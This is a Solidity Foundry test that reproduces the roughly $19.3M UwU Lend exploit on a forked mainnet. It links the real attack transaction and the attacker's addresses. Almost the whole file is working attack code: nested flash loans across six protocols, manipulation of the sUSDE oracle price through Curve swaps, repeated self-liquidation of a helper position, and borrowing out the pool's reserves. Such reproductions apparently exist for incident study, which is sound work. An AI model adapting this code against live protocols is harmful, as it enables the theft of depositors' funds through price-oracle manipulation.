// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$19.3M
// TX : https://app.blocksec.com/explorer/tx/eth/0x242a0fb4fde9de0dc2fd42e8db743cbc197ffa2bf6a036ba0bba303df296408b
// Attacker : https://etherscan.io/address/0x841ddf093f5188989fa1524e7b893de64b421f47
// Attack Contract : https://etherscan.io/address/0xf19d66e82ffe8e203b30df9e81359f8a201517ad
// Vulnerable Contract : https://etherscan.io/address/0x2409af0251dcb89ee3dee572629291f9b087c668
// GUY : https://x.com/peckshield/status/1800176089316163831

interface IcrvUSDController {
    function create_loan(uint256 collateral_amount, uint256 debt_amount, uint256 N) external;

    function repay(uint256 amount, address to, int256 max_fee, bool) external;
}

interface IAaveOracle {
    function getAssetPrice(
        address asset
    ) external view returns (uint256);
}

interface ISDAI is IERC20 {
    function redeem(uint256 amount, address to, address owner) external returns (uint256);
}

contract UwuLend_First_exp is Test {
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 crvUSD = IERC20(0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E);
    IERC20 WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IERC20 sUSDE = IERC20(0x9D39A5DE30e57443BfF2A8307A4256c8797A3497);
    IERC20 USDE = IERC20(0x4c9EDD5852cd905f086C759E8383e09bff1E68B3);
    IERC20 GHO = IERC20(0x40D16FC0246aD3160Ccc09B8D0D3A2cD28aE6C2f);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 FRAX = IERC20(0x853d955aCEf822Db058eb8505911ED77F175b99e);
    IcrvUSDController crvUSDController = IcrvUSDController(0xA920De414eA4Ab66b97dA1bFE9e6EcA7d4219635);
    IcrvUSDController crvUSDWETHPool = IcrvUSDController(0x2409aF0251DCB89EE3Dee572629291f9B087c668);
    ISDAI sDAI = ISDAI(0x83F20F44975D03b1b09e64809B757c47f942BEeA);

    ICurvePool USDecrvUSDPool = ICurvePool(0xF55B0f6F2Da5ffDDb104b58a60F2862745960442);
    ICurvePool USDeDAIPool = ICurvePool(0xF36a4BA50C603204c3FC6d2dA8b78A7b69CBC67d);
    ICurvePool FRAXUSDePool = ICurvePool(0x5dc1BF6f1e983C0b21EfB003c105133736fA0743);
    ICurvePool GHOUSDePool = ICurvePool(0x670a72e6D22b0956C0D2573288F82DCc5d6E3a61);
    ICurvePool USDCUSDePool = ICurvePool(0x02950460E2b9529D0E00284A5fA2d7bDF3fA4d72);
    ICurvePool MtEthena = ICurvePool(0x167478921b907422F8E88B43C4Af2B8BEa278d3A);

    Uni_Pair_V3 DAI_FRAX_Pair = Uni_Pair_V3(0x97e7d56A0408570bA1a7852De36350f7713906ec);
    Uni_Pair_V3 DAI_USDC_Pair = Uni_Pair_V3(0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168);
    Uni_Pair_V3 USDC_WETH_Pair = Uni_Pair_V3(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);
    Uni_Pair_V3 WBTC_WETH_Pair = Uni_Pair_V3(0x4585FE77225b41b697C938B018E2Ac67Ac5a20c0);

    IAaveFlashloan aaveFlashloan_1 = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    IAaveFlashloan aaveFlashloan_2 = IAaveFlashloan(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    IAaveFlashloan sparkPool = IAaveFlashloan(0xC13e21B648A5Ee794902342038FF3aDAB66BE987);
    IMorphoBuleFlashLoan morphoBlueFlashLoan = IMorphoBuleFlashLoan(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb);
    IUniswapV3Flash FRAX_USDC_Pair = IUniswapV3Flash(0xc63B0708E2F7e69CB8A1df0e1389A98C35A76D52);
    IBalancerVault BalancerVault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IMakerDaoFlash makerDaoFlash = IMakerDaoFlash(0x60744434d6339a6B27d73d9Eda62b6F66a0a04FA);

    ILendingPool uwuLendPool = ILendingPool(0x2409aF0251DCB89EE3Dee572629291f9B087c668);
    IAaveOracle uwuPriceOracle = IAaveOracle(0xAC4A2aC76D639E10f2C05a41274c1aF85B772598);
    IERC20 uSUSDE = IERC20(0xf1293141fC6ab23b2a0143Acc196e3429e0B67A6);
    IERC20 uWETH = IERC20(0x67fadbD9Bf8899d7C578db22D7af5e2E500E13e5);
    IERC20 uWBTC = IERC20(0x6Ace5c946a3Abd8241f31f182c479e67A4d8Fc8d);
    IERC20 uDAI = IERC20(0xb95BD0793bCC5524AF358ffaae3e38c3903C7626);

    uint256 constant WETHMAXLTV = 8500; // 85%
    uint256 constant LiquidationThreshold = 9000; // 90%
    uint256 constant liquidationBonus = 11_000; // 110%

    ToBeLiquidatedHelper toBeLiquidatedHelper;
    BorrowHelper borrowHelper;

    function setUp() public {
        vm.createSelectFork("mainnet", 20_061_318);
        vm.label(address(WETH), "WETH");
        vm.label(address(DAI), "DAI");
        vm.label(address(crvUSD), "crvUSD");
        vm.label(address(WBTC), "WBTC");
        vm.label(address(sUSDE), "sUSDE");
        vm.label(address(USDE), "USDE");
        vm.label(address(GHO), "GHO");
        vm.label(address(USDC), "USDC");
        vm.label(address(FRAX), "FRAX");
        vm.label(address(crvUSDController), "crvUSDController");
        vm.label(address(crvUSDWETHPool), "crvUSDWETHPool");
        vm.label(address(USDecrvUSDPool), "USDecrvUSDPool");
        vm.label(address(USDeDAIPool), "USDeDAIPool");
        vm.label(address(FRAXUSDePool), "FRAXUSDePool");
        vm.label(address(GHOUSDePool), "GHOUSDePool");
        vm.label(address(USDCUSDePool), "USDCUSDePool");
        vm.label(address(MtEthena), "MtEthena");
        vm.label(address(aaveFlashloan_1), "aaveFlashloan_1");
        vm.label(address(aaveFlashloan_2), "aaveFlashloan_2");
        vm.label(address(sparkPool), "sparkPool");
        vm.label(address(morphoBlueFlashLoan), "morphoBlueFlashLoan");
        vm.label(address(FRAX_USDC_Pair), "FRAX_USDC_Pair");
        vm.label(address(BalancerVault), "balancerVault");
        vm.label(address(makerDaoFlash), "makerDaoFlash");
        vm.label(address(uwuLendPool), "uwuLendPool");
        vm.label(address(uwuPriceOracle), "uwuPriceOracle");
        vm.label(address(uSUSDE), "uSUSDE");
        vm.label(address(uWETH), "uWETH");
        vm.label(address(uWBTC), "uWBTC");
        vm.label(address(uDAI), "uDAI");
        vm.label(address(DAI_FRAX_Pair), "DAI_FRAX_Pair");
        vm.label(address(DAI_USDC_Pair), "DAI_USDC_Pair");
        vm.label(address(USDC_WETH_Pair), "USDC_WETH_Pair");
        vm.label(address(WBTC_WETH_Pair), "WBTC_WETH_Pair");
        vm.label(address(sDAI), "sDAI");
    }

    function testExploit() public {
        toBeLiquidatedHelper = new ToBeLiquidatedHelper();
        vm.label(address(toBeLiquidatedHelper), "toBeLiquidatedHelper");
        borrowHelper = new BorrowHelper();
        vm.label(address(borrowHelper), "borrowHelper");

        // 1. approve all
        console.log("1. approveAll \n");
        approveAll();

        // 2. flashLoan
        // 2.1 aave flashloan WETH and WBTC
        // 2.2 sparkPool flashloan WETH and WBTC
        // 2.3 morphoBlueFlashLoan flashloan sUSDE USDE DAI
        // 2.4 FRAX_USDC_Pair flashloan USDC and FRAX
        // 2.5 BalancerVault flashloan USDC
        // 2.6 makerDaoFlash flashloan DAI
        console.log("2. flashLoan");
        flashLoan();

        // 3. exploit logic in onFlashLoan

        // 5. profit

        emit log_named_decimal_uint("\n  attacker profit", WETH.balanceOf(address(this)), WETH.decimals());
    }

    // exploit logic
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        DAI.approve(address(makerDaoFlash), type(uint256).max);

        logFlashLoanAssets();

        // 3. Make bad debt (during liquidation process) position by sUSDE price manipulation
        console.log("\n  3. Make bad debt (during liquidation process) position by sUSDE price manipulation \n");
        // 3.1 drive down sUSDE price
        console.log("3.1 drive down sUSDE price");

        uint256 sUSDE_price_before = uwuPriceOracle.getAssetPrice(address(sUSDE));
        console.log("sUSDE price before", sUSDE_price_before);

        driveDownsUSDEPrice();

        uint256 sUSDE_price_after = uwuPriceOracle.getAssetPrice(address(sUSDE));
        console.log("sUSDE price after", sUSDE_price_after);
        emit log_named_decimal_uint(
            "sUSDE price change ratio ", (sUSDE_price_before - sUSDE_price_after) * 1e8 / sUSDE_price_before, 8
        );

        // 3.2 deposit WBTC DAI sUSDE to uwuLendPool and set WBTC, DAI as collateral

        uwuLendPool.deposit(address(WBTC), WBTC.balanceOf(address(this)), address(this), 0);
        uwuLendPool.deposit(address(DAI), DAI.balanceOf(address(this)) - 30_000_000 ether, address(this), 0);
        uwuLendPool.deposit(address(sUSDE), sUSDE.balanceOf(address(this)), address(this), 0);
        uwuLendPool.setUserUseReserveAsCollateral(address(sUSDE), false);

        // 3.3 transfer WETH to toBeLiquidatedHelper contract and create sUSDE debt position to max ltv
        console.log("\n  3.3 transfer WETH to toBeLiquidatedHelper contract and create sUSDE debt position to max ltv");
        console.log("-------------------------------helper contract open position -----------------------------------");

        WETH.transfer(address(toBeLiquidatedHelper), WETH.balanceOf(address(this)));
        toBeLiquidatedHelper.openPosition();
        addETHCollateralToHelper();
        toBeLiquidatedHelper.openPosition();

        (
            uint256 totalCollateral,
            uint256 totalDebt,
            uint256 availableBorrows,
            uint256 currentLiquidationThreshold,
            uint256 ltv,
            uint256 healthFactor
        ) = uwuLendPool.getUserAccountData(address(toBeLiquidatedHelper));

        emit log_named_decimal_uint("to be liquidated position debt value", totalDebt, 8);
        uint256 currentLTV = totalDebt * 1e4 / totalCollateral;
        emit log_named_decimal_uint("current ltv", currentLTV, 4);
        emit log_named_decimal_uint("maxLtv", WETHMAXLTV, 4);
        emit log_named_decimal_uint("current healthFactor", healthFactor, 18);

        // 3.4 liquidation threshold reached by withdraw collateral
        console.log("\n  3.4 liquidation threshold reached by withdraw collateral");
        toBeLiquidatedHelper.withdrawCollateralToLiquidationThreshold();

        (totalCollateral, totalDebt,,,, healthFactor) = uwuLendPool.getUserAccountData(address(toBeLiquidatedHelper));
        currentLTV = totalDebt * 1e4 / totalCollateral;
        emit log_named_decimal_uint("current ltv", currentLTV, 4);
        emit log_named_decimal_uint("maxLtv", WETHMAXLTV, 4);
        emit log_named_decimal_uint("current healthFactor", healthFactor, 18);

        console.log("------------------------helper contract was ready to be liquidated ------------------------------");
        console.log("");

        // 3.5 drive up sUSDE price
        console.log("3.5 drive up sUSDE price");
        uint256 sUSDE_price_before_driveUp = uwuPriceOracle.getAssetPrice(address(sUSDE));
        console.log("sUSDE price before", sUSDE_price_before_driveUp);

        driveUpsUSDEPrice();

        uint256 sUSDE_price_after_driveUp = uwuPriceOracle.getAssetPrice(address(sUSDE));
        console.log("sUSDE price after", sUSDE_price_after_driveUp);
        emit log_named_decimal_uint(
            "sUSDE price change ratio ",
            (sUSDE_price_after_driveUp - sUSDE_price_before_driveUp) * 1e8 / sUSDE_price_before_driveUp,
            8
        );

        // 4. liquidate helper contract to theft assets from protocol

        console.log("\n  4. liquidate helper contract to theft assets from protocol");
        (totalCollateral, totalDebt,,, ltv, healthFactor) =
            uwuLendPool.getUserAccountData(address(toBeLiquidatedHelper));
        emit log_named_decimal_uint("total collateral value", totalCollateral, 8);
        emit log_named_decimal_uint("total debt value", totalDebt, 8);
        currentLTV = totalDebt * 1e4 / totalCollateral;
        emit log_named_decimal_uint("current ltv", currentLTV, 4);
        emit log_named_decimal_uint("health factor", healthFactor, 18);
        uint256 badDebtRatio = currentLTV * liquidationBonus / 1e4 - 1e4;
        emit log_named_decimal_uint("bad debt ratio", badDebtRatio, 4);

        // 4.1 repeat liquidate helper contract
        console.log("\n  4.1 repeat liquidate helper contract");
        uwuLendPool.liquidationCall(
            address(WETH), address(sUSDE), address(toBeLiquidatedHelper), sUSDE.balanceOf(address(this)), true
        );
        while (uWETH.balanceOf(address(toBeLiquidatedHelper)) > 0) {
            uwuLendPool.withdraw(address(sUSDE), sUSDE.balanceOf(address(uSUSDE)), address(this));
            uwuLendPool.liquidationCall(
                address(WETH), address(sUSDE), address(toBeLiquidatedHelper), sUSDE.balanceOf(address(this)), true
            );
        }

        // 4.2 withdraw deposited collateral from uwuLendPool
        console.log("\n  4.2 withdraw deposited collateral from uwuLendPool");
        uwuLendPool.withdraw(address(WETH), WETH.balanceOf(address(uWETH)), address(this));
        uwuLendPool.repay(address(WETH), type(uint256).max, 2, address(this));
        uwuLendPool.withdraw(address(WETH), uWETH.balanceOf(address(this)), address(this));

        uwuLendPool.withdraw(address(WBTC), uWBTC.balanceOf(address(this)), address(this));
        uwuLendPool.withdraw(address(DAI), uDAI.balanceOf(address(this)), address(this));
        uwuLendPool.withdraw(address(sUSDE), sUSDE.balanceOf(address(uSUSDE)), address(this));

        emit log_named_decimal_uint(
            "\n  attacker stolen uSUSDE balance", uSUSDE.balanceOf(address(this)), uSUSDE.decimals()
        );
        uint256 stolenuSUSDEValue =
            uSUSDE.balanceOf(address(this)) * uwuPriceOracle.getAssetPrice(address(sUSDE)) / 1e18;
        emit log_named_decimal_uint("stolen uSUSDE value", stolenuSUSDEValue, 8);

        uwuLendPool.deposit(address(sUSDE), 4_346_738_161_827_961_681_800_155, address(this), 0);
        uSUSDE.transfer(address(borrowHelper), uSUSDE.balanceOf(address(this)));

        // 4.3 Borrowing other assets with stolen sUSDE
        console.log("\n  4.3 Borrowing other assets with stolen sUSDE");
        borrowHelper.borrow();

        // 4.4 swap assets to repay flashloan
        console.log("\n  4.4 swap assets to repay flashloan");
        // swap USDE to crvUSD
        USDecrvUSDPool.exchange(0, 1, 4_207_072_750_824_992_858_620_994, 0, address(this));
        // swap USDE to DAI
        USDeDAIPool.exchange(0, 1, 10_922_948_419_648_084_328_018_472, 0, address(this));
        // swap USDE to FRAX
        FRAXUSDePool.exchange(1, 0, 22_726_036_777_489_049_150_148_818, 0, address(this));
        // swap USDE to GHO
        GHOUSDePool.exchange(1, 0, 3_839_532_488_615_605_211_975_616, 0, address(this));
        // swap USDE to USDC
        USDCUSDePool.exchange(0, 1, 13_004_083_286_363_350_285_706_546, 0, address(this));

        // repay crvUSD loan
        crvUSDController.repay(8_000_000 ether, address(this), type(int256).max, false);
        // swap GHO to USDE
        GHOUSDePool.exchange(0, 1, 6_514_807_919_582_140_746_012, 0, address(this));
        // swap sUSDE to sDAI
        sUSDE.approve(address(MtEthena), type(uint256).max);
        MtEthena.exchange(1, 0, 461_496_017_260_554_794_537_319, 0, address(this));
        sDAI.redeem(sDAI.balanceOf(address(this)), address(this), address(this));
        // swap crvUSD to USDE
        USDecrvUSDPool.exchange(1, 0, 13_674_859_859_068_798_018_828, 0, address(this));
        // swap USDC to USDE
        USDCUSDePool.exchange(1, 0, 192_649_121_137, 0, address(this));
        // swap USDE to USDC
        USDCUSDePool.exchange(0, 1, 5_476_157_462_097_941_699_706, 0, address(this));
        // swap FRAX to DAI
        DAI_FRAX_Pair.swap(
            address(this), false, 43_839_520_259_800_487_407_899, 88_130_155_430_238_081_648_620_165_685, ""
        );

        // swap DAI to USDC
        int256 swapAmount = int256(
            DAI.balanceOf(address(this)) - (100_786_052_157_846_064_524_359_193 + 500_000_000_000_000_000_000_000_000)
        );
        DAI_USDC_Pair.swap(address(this), true, swapAmount, 71_305_012_436_624_238_479_427, "");
        // swap USDC to WETH
        swapAmount = int256(USDC.balanceOf(address(this)) - 15_007_500_000_000);
        USDC_WETH_Pair.swap(address(this), true, swapAmount, 1_176_655_315_611_429_354_240_742_931_620_633, "");
        // swap WETH to WBTC
        WBTC_WETH_Pair.swap(address(this), false, -740_000_000, 38_270_603_846_108_809_178_175_541_220_721_878, "");

        bytes32 CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
        return CALLBACK_SUCCESS;
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        if (msg.sender == address(DAI_FRAX_Pair)) {
            FRAX.transfer(msg.sender, uint256(amount1Delta));
        } else if (msg.sender == address(DAI_USDC_Pair)) {
            DAI.transfer(msg.sender, uint256(amount0Delta));
        } else if (msg.sender == address(USDC_WETH_Pair)) {
            USDC.transfer(msg.sender, uint256(amount0Delta));
        } else if (msg.sender == address(WBTC_WETH_Pair)) {
            WETH.transfer(msg.sender, uint256(amount1Delta));
        }
    }

    function depositsUSDEBackToUWULendPool() external {
        uwuLendPool.deposit(address(sUSDE), sUSDE.balanceOf(address(this)), address(this), 0);
    }

    function addETHCollateralToHelper() internal {
        uwuLendPool.borrow(address(WETH), WETH.balanceOf(address(uWETH)), 2, 0, address(this));
        WETH.transfer(address(toBeLiquidatedHelper), WETH.balanceOf(address(this)));
    }

    function flashLoan() internal {
        console.log("");

        console.log("2.1 aave flashloan WETH and WBTC");
        address[] memory assets_1 = new address[](2);
        assets_1[0] = address(WETH);
        assets_1[1] = address(WBTC);
        uint256[] memory amounts_1 = new uint256[](2);
        amounts_1[0] = 159_053_162_780_836_655_603_083;
        amounts_1[1] = 1_480_000_000_000;
        uint256[] memory modes_1 = new uint256[](2);
        modes_1[0] = 0;
        modes_1[1] = 0;
        aaveFlashloan_1.flashLoan(address(this), assets_1, amounts_1, modes_1, address(0), "", 0);
    }

    function driveDownsUSDEPrice() internal {
        // mint crvUSD
        crvUSDController.create_loan(10_000 ether, 8_000_000 ether, 6);

        // swap USDE to crvUSD
        USDecrvUSDPool.exchange(0, 1, 8_730_453_498_050_216_501_648_556, 0, address(this));
        // swap USDE to DAI
        USDeDAIPool.exchange(0, 1, 14_477_791_691_163_726_567_797_192, 0, address(this));
        // swap USDE to FRAX
        FRAXUSDePool.exchange(1, 0, 46_652_158_056_743_271_680_044_538, 0, address(this));
        // swap USDE to GHO
        GHOUSDePool.exchange(1, 0, 4_925_427_200_616_322_077_942_681, 0, address(this));
        // swap USDE to USDC
        USDCUSDePool.exchange(0, 1, 14_886_912_832_938_992_141_787_347, 0, address(this));
    }

    function driveUpsUSDEPrice() internal {
        // swap crvUSD to USDE
        USDecrvUSDPool.exchange(1, 0, 12_924_955_610_043_587_089_395_372, 0, address(this));
        // swap DAI to USDE
        USDeDAIPool.exchange(1, 0, 25_373_741_448_450_577_167_233_296, 0, address(this));
        // swap FRAX to USDE
        FRAXUSDePool.exchange(0, 1, 69_315_752_743_500_180_119_051_361, 0, address(this));
        // swap GHO to USDE
        GHOUSDePool.exchange(0, 1, 8_765_879_316_233_443_559_385_780, 0, address(this));
        // swap USDC to USDE
        USDCUSDePool.exchange(1, 0, 27_858_597_561_515, 0, address(this));
    }

    // aaveFlashloan_1 callback
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external payable returns (bool) {
        if (msg.sender == address(aaveFlashloan_1)) {
            WETH.approve(address(msg.sender), type(uint256).max);
            WBTC.approve(address(msg.sender), type(uint256).max);

            // aaveV2 flashloan WETH
            address[] memory assets_2 = new address[](1);
            assets_2[0] = address(WETH);
            uint256[] memory amounts_2 = new uint256[](1);
            amounts_2[0] = 40_000_000_000_000_000_000_000;
            uint256[] memory modes_2 = new uint256[](1);
            modes_2[0] = 0;
            aaveFlashloan_2.flashLoan(address(this), assets_2, amounts_2, modes_2, address(0), "", 0);
            return true;
        } else if (msg.sender == address(aaveFlashloan_2)) {
            WETH.approve(address(msg.sender), type(uint256).max);

            // 2.2 sparkPool flashloan WETH and WBTC
            console.log("2.2 sparkPool flashloan WETH and WBTC");
            address[] memory assets_3 = new address[](2);
            assets_3[0] = address(WETH);
            assets_3[1] = address(WBTC);
            uint256[] memory amounts_3 = new uint256[](2);
            amounts_3[0] = 91_075_709_275_272_202_604_853;
            amounts_3[1] = 497_979_338_310;
            uint256[] memory modes_3 = new uint256[](2);
            modes_3[0] = 0;
            modes_3[1] = 0;
            sparkPool.flashLoan(address(this), assets_3, amounts_3, modes_3, address(0), "", 0);
            return true;
        } else if (msg.sender == address(sparkPool)) {
            WETH.approve(address(msg.sender), type(uint256).max);
            WBTC.approve(address(msg.sender), type(uint256).max);

            // 2.3 morphoBlueFlashLoan flashloan sUSDE USDE DAI
            console.log("2.3 morphoBlueFlashLoan flashloan sUSDE USDE DAI");
            morphoBlueFlashLoan.flashLoan(address(sUSDE), 301_738_880_017_013_808_137_779_682, "");
            return true;
        }
    }

    function onMorphoFlashLoan(uint256 amounts, bytes calldata) external {
        if (amounts == 301_738_880_017_013_808_137_779_682) {
            sUSDE.approve(address(morphoBlueFlashLoan), type(uint256).max);
            morphoBlueFlashLoan.flashLoan(address(USDE), 236_934_023_171_356_495_803_977_358, "");
        } else if (amounts == 236_934_023_171_356_495_803_977_358) {
            USDE.approve(address(morphoBlueFlashLoan), type(uint256).max);
            morphoBlueFlashLoan.flashLoan(address(DAI), 100_786_052_157_846_064_524_359_193, "");
        } else if (amounts == 100_786_052_157_846_064_524_359_193) {
            DAI.approve(address(morphoBlueFlashLoan), type(uint256).max);

            // 2.4 FRAX_USDC_Pair flashloan USDC and FRAX
            console.log("2.4 FRAX_USDC_Pair flashloan USDC and FRAX");
            FRAX_USDC_Pair.flash(address(this), 60_000_000_000_000_000_000_000_000, 15_000_000_000_000, "");
        }
    }

    function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {
        // 2.5 BalancerVault flashloan USDC
        console.log("2.5 BalancerVault flashloan USDC");
        address[] memory tokens = new address[](2);
        tokens[0] = address(GHO);
        tokens[1] = address(WETH);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 4_627_557_475_392_554_171_233_727;
        amounts[1] = 38_413_346_774_514_588_021_409;
        BalancerVault.flashLoan(address(this), tokens, amounts, "");
        FRAX.transfer(address(msg.sender), 60_030_000_000_000_000_000_000_000);
        USDC.transfer(address(msg.sender), 15_007_500_000_000);
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        // 2.6 makerDaoFlash flashloan DAI
        console.log("2.6 makerDaoFlash flashloan DAI \n");
        makerDaoFlash.flashLoan(address(this), address(DAI), 500_000_000_000_000_000_000_000_000, "");

        GHO.transfer(address(msg.sender), 4_627_557_475_392_554_171_233_727);
        WETH.transfer(address(msg.sender), 38_413_346_774_514_588_021_409);
    }

    function logFlashLoanAssets() internal {
        emit log_named_decimal_uint(
            "Attacker WETH balance after flashloan", WETH.balanceOf(address(this)), WETH.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker WBTC balance after flashloan", WBTC.balanceOf(address(this)), WBTC.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker sUSDE balance after flashloan", sUSDE.balanceOf(address(this)), sUSDE.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker USDE balance after flashloan", USDE.balanceOf(address(this)), USDE.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker DAI balance after flashloan", DAI.balanceOf(address(this)), DAI.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker FRAX balance after flashloan", FRAX.balanceOf(address(this)), FRAX.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker USDC balance after flashloan", USDC.balanceOf(address(this)), USDC.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker GHO balance after flashloan", GHO.balanceOf(address(this)), GHO.decimals()
        );
        uint256 flashloan_value = WETH.balanceOf(address(this)) * 3500 + WBTC.balanceOf(address(this)) * 65_000 * 1e10
            + sUSDE.balanceOf(address(this)) + USDE.balanceOf(address(this)) + DAI.balanceOf(address(this))
            + FRAX.balanceOf(address(this)) + USDC.balanceOf(address(this)) * 1e12 + GHO.balanceOf(address(this));
        emit log_named_decimal_uint("Attacker flashloan USD value", flashloan_value, 18);
    }

    function approveAll() internal {
        WETH.approve(address(uwuLendPool), type(uint256).max);
        DAI.approve(address(uwuLendPool), type(uint256).max);
        WBTC.approve(address(uwuLendPool), type(uint256).max);
        sUSDE.approve(address(uwuLendPool), type(uint256).max);
        crvUSD.approve(address(crvUSDController), type(uint256).max);
        WETH.approve(address(crvUSDController), type(uint256).max);
        WETH.approve(address(crvUSDWETHPool), type(uint256).max);

        crvUSD.approve(address(USDecrvUSDPool), type(uint256).max);
        USDE.approve(address(USDecrvUSDPool), type(uint256).max);
        FRAX.approve(address(FRAXUSDePool), type(uint256).max);
        USDE.approve(address(FRAXUSDePool), type(uint256).max);
        GHO.approve(address(GHOUSDePool), type(uint256).max);
        USDE.approve(address(GHOUSDePool), type(uint256).max);
        USDC.approve(address(USDCUSDePool), type(uint256).max);
        USDE.approve(address(USDCUSDePool), type(uint256).max);
        DAI.approve(address(USDeDAIPool), type(uint256).max);
        USDE.approve(address(USDeDAIPool), type(uint256).max);
    }
}

contract ToBeLiquidatedHelper {
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 sUSDE = IERC20(0x9D39A5DE30e57443BfF2A8307A4256c8797A3497);
    ILendingPool uwuLendPool = ILendingPool(0x2409aF0251DCB89EE3Dee572629291f9B087c668);
    address uSUSDE = 0xf1293141fC6ab23b2a0143Acc196e3429e0B67A6;
    IAaveOracle uwuPriceOracle = IAaveOracle(0xAC4A2aC76D639E10f2C05a41274c1aF85B772598);

    function openPosition() external {
        WETH.approve(address(uwuLendPool), type(uint256).max);
        uwuLendPool.deposit(address(WETH), WETH.balanceOf(address(this)), address(this), 0);
        uint256 sUSDE_price = uwuPriceOracle.getAssetPrice(address(sUSDE));

        (,, uint256 availableBorrows,,,) = uwuLendPool.getUserAccountData(address(this));
        while (availableBorrows >= sUSDE.balanceOf(address(uSUSDE)) * sUSDE_price / 10 ** sUSDE.decimals()) {
            uwuLendPool.borrow(address(sUSDE), sUSDE.balanceOf(address(uSUSDE)), 2, 0, address(this));
            sUSDE.transfer(address(msg.sender), sUSDE.balanceOf(address(this)));
            (bool success,) =
                address(msg.sender).call(abi.encodeWithSelector(bytes4(keccak256("depositsUSDEBackToUWULendPool()"))));
            require(success, "depositsUSDEBackToUWULendPool failed");
            (,, availableBorrows,,,) = uwuLendPool.getUserAccountData(address(this));
        }

        uint256 lastAmount = availableBorrows * 10 ** sUSDE.decimals() / sUSDE_price;
        uwuLendPool.borrow(address(sUSDE), lastAmount, 2, 0, address(this));
        sUSDE.transfer(address(msg.sender), sUSDE.balanceOf(address(this)));
    }

    function withdrawCollateralToLiquidationThreshold() external {
        uint256 sUSDE_price = uwuPriceOracle.getAssetPrice(address(sUSDE));
        uint256 WETH_price = uwuPriceOracle.getAssetPrice(address(WETH));

        (
            uint256 totalCollateral,
            uint256 totalDebt,
            uint256 availableBorrows,
            uint256 currentLiquidationThreshold,
            uint256 ltv,
            uint256 healthFactor
        ) = uwuLendPool.getUserAccountData(address(this));
        uint256 maxWithdraw = totalCollateral - (totalDebt * 10_000 / currentLiquidationThreshold);
        maxWithdraw = maxWithdraw * 10 ** WETH.decimals() / WETH_price;
        uwuLendPool.withdraw(address(WETH), maxWithdraw, address(this));

        WETH.transfer(address(msg.sender), WETH.balanceOf(address(this)));
    }
}

contract BorrowHelper {
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 uWETH = IERC20(0x67fadbD9Bf8899d7C578db22D7af5e2E500E13e5);
    IERC20 sUSDE = IERC20(0x9D39A5DE30e57443BfF2A8307A4256c8797A3497);
    ILendingPool uwuLendPool = ILendingPool(0x2409aF0251DCB89EE3Dee572629291f9B087c668);
    IERC20 uSUSDE = IERC20(0xf1293141fC6ab23b2a0143Acc196e3429e0B67A6);
    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IERC20 uWBTC = IERC20(0x6Ace5c946a3Abd8241f31f182c479e67A4d8Fc8d);
    IERC20 uDAI = IERC20(0xb95BD0793bCC5524AF358ffaae3e38c3903C7626);
    IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 uUSDT = IERC20(0x24959F75d7BDA1884f1Ec9861f644821Ce233c7D);
    Uni_Pair_V3 USDT_WETH_Pair = Uni_Pair_V3(0x11b815efB8f581194ae79006d24E0d814B7697F6);

    IAaveOracle uwuPriceOracle = IAaveOracle(0xAC4A2aC76D639E10f2C05a41274c1aF85B772598);

    function borrow() external {
        uwuLendPool.borrow(address(DAI), DAI.balanceOf(address(uDAI)), 2, 0, address(this));
        uwuLendPool.borrow(address(USDT), USDT.balanceOf(address(uUSDT)), 2, 0, address(this));
        uwuLendPool.borrow(address(WETH), WETH.balanceOf(address(uWETH)), 2, 0, address(this));
        uwuLendPool.borrow(address(WBTC), WBTC.balanceOf(address(uWBTC)), 2, 0, address(this));
        uwuLendPool.withdraw(address(sUSDE), sUSDE.balanceOf(address(uSUSDE)), msg.sender);

        USDT_WETH_Pair.swap(
            address(this), false, int256(USDT.balanceOf(address(this))), 5_334_772_629_276_810_319_154_680, new bytes(0)
        );
        DAI.transfer(msg.sender, DAI.balanceOf(address(this)));
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        address(USDT).call(
            abi.encodeWithSelector(bytes4(keccak256("transfer(address,uint256)")), msg.sender, uint256(amount1Delta))
        );
    }
}
